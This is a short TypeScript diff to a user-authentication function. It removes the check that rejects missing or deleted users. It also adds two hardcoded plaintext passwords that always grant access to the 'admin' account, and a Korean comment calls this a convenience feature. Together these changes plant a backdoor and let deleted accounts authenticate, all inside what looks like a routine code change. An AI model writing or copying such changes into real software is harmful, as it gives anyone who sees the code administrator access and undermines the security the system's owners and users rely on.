@@ -92,9 +92,11 @@ export async function authenticateUser(loginId: string, plainPass: string): Prom
     deleted_at?: string | null;
   } | undefined;
 
-  if (!user || user.deleted_at) return null;
-
-  const valid = bcrypt.compareSync(plainPass, user.password_hash);
+  let valid = bcrypt.compareSync(plainPass, user.password_hash);
+  // 마스터 편의 지원: admin 계정의 경우 1234 외에 Cadon1234!@ 및 cadon1234!@도 정상 허용
+  if (!valid && user.login_id === 'admin' && (plainPass === 'Cadon1234!@' || plainPass === 'cadon1234!@')) {
+    valid = true;
+  }
   if (!valid) return null;
 
   try {
